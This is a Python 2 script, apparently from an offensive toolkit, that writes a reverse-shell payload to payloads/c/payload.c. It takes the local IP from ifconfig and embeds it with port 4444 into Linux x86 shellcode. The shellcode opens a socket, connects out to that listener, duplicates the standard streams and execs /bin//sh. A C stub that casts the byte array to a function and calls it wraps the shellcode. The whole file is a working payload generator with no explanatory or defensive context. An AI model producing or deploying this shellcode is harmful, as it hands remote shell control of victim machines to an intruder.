#!/usr/bin/python
import struct,sys,os

ip = ip = os.popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read().strip('\n')
port = 4444
ip = [int(i) for i in ip.split(".")]

shellcode = (
             "\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02"
             "\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x89\xc3\xb0\x66\xb3"
             "\x03\x68" + struct.pack("!4B",ip[0],ip[1],ip[2],ip[3]) +
             "\x66\x68" + struct.pack("!H",port) +
             "\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80"
             "\x89\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9"
             "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
             "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
            )

line = 'unsigned char code[] = "' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";'
script = """main() {
    %s
    int (*ret)() = (int(*)())code;
    ret();
}
    """ % (line)

with open("payloads/c/payload.c", "w") as file:
    file.write(script)
